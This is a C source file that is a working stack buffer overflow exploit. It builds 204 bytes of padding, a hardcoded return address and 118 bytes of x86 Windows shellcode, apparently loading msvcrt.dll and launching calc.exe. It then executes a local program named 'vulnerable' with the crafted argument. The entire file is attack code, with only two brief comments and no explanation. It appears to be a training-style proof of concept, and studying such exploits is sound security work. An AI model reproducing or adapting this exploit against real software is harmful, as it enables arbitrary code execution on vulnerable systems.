#include <stdio.h>
#include <string.h>
#include <stdlib.h>


int main (void)
{
	char *argv[3];

	//the the return should start after 204 bytes (200 bytes of buffer)
    // padding 204 bytes 
	char padding[] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
					"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
                    "AAAA";

	// shell code 118 bytes
	char shellcode_obj[] = "\x55\x8b\xec\x53\x56\x57\x55\x8b\xec\x33"
				    "\xff\x57\x83\xec\x0c\xc6\x45\xf5\x6d\xc6"
                    "\x45\xf6\x73\xc6\x45\xf7\x76\xc6\x45\xf8"
                    "\x63\xc6\x45\xf9\x72\xc6\x45\xfa\x74\xc6"
                    "\x45\xfb\x2e\xc6\x45\xfc\x64\xc6\x45\xfd"
                    "\x6c\xc6\x45\xfe\x6c\x8d\x45\xf5\x50\xbb"
                    "\x7b\x1d\x80\x7c\xff\xd3"
  
					"\x55\x8b\xec\x33\xff\x57\x83\xec\x08\xc6"
					"\x45\xf7\x63\xc6\x45\xf8\x61\xc6\x45\xf9"
                    "\x6c\xc6\x45\xfa\x63\xc6\x45\xfb\x2e\xc6"
                    "\x45\xfc\x65\xc6\x45\xfd\x78\xc6\x45\xfe"
                    "\x65\x8d\x45\xf7\x50\xbb\xc7\x93\xc2\x77"
                    "\xff\xd3";

	char ret[] = "\x7b\x46\x86\x7c";

	char str[500];
	strcpy(str, padding);
	strcat(str, ret);
	strcat(str, shellcode_obj);

	argv[0] = "vulnerable";
	argv[1] = str;
	argv[2] = '\0';

	printf("%s\n", str);

	execv("vulnerable", argv);

    return 0;
}